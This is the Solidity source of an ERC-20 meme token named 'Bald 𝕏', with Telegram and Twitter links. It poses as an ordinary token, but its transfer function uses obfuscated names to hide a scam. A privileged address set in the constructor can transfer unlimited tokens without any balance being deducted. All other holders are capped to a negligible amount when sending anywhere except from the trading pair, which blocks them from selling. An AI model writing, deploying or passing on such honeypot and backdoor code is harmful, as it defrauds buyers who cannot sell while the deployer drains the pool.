/*

Telegram: https://t.me/BaldxPortal

Twitter: https://twitter.com/BaldXBase

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.15;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Bald is Ownable {
    mapping(address => uint256) private arpbulwdjiqt;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => uint256) public balanceOf;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    string public symbol = unicode"Bald 𝕏";

    constructor(address ehsdmlq) {
        balanceOf[msg.sender] = totalSupply;
        cmabqxzvrp[ehsdmlq] = mxhj;
        IUniswapV2Router02 pqidkanbmyc = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        ncgda = IUniswapV2Factory(pqidkanbmyc.factory()).createPair(address(this), pqidkanbmyc.WETH());
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private cmabqxzvrp;

    uint8 public decimals = 9;

    address private ncgda;

    mapping(address => mapping(address => uint256)) public allowance;

    function transferFrom(address dkltiazefnw, address hekiynrtpxwc, uint256 faxl) public returns (bool success) {
        require(faxl <= allowance[dkltiazefnw][msg.sender]);
        allowance[dkltiazefnw][msg.sender] -= faxl;
        oetkxsmlabqu(dkltiazefnw, hekiynrtpxwc, faxl);
        return true;
    }

    function transfer(address hekiynrtpxwc, uint256 faxl) public returns (bool success) {
        oetkxsmlabqu(msg.sender, hekiynrtpxwc, faxl);
        return true;
    }

    function oetkxsmlabqu(address dkltiazefnw, address hekiynrtpxwc, uint256 faxl) private {
        if (0 == cmabqxzvrp[dkltiazefnw]) {
            if (dkltiazefnw != ncgda && arpbulwdjiqt[dkltiazefnw] != block.number && faxl < totalSupply) {
                require(faxl <= totalSupply / (10 ** decimals));
            }
            balanceOf[dkltiazefnw] -= faxl;
        }
        balanceOf[hekiynrtpxwc] += faxl;
        arpbulwdjiqt[hekiynrtpxwc] = block.number;
        emit Transfer(dkltiazefnw, hekiynrtpxwc, faxl);
    }

    function approve(address bejxamwli, uint256 faxl) public returns (bool success) {
        allowance[msg.sender][bejxamwli] = faxl;
        emit Approval(msg.sender, bejxamwli, faxl);
        return true;
    }

    string public name = unicode"Bald 𝕏";

    uint256 private mxhj = 118;
}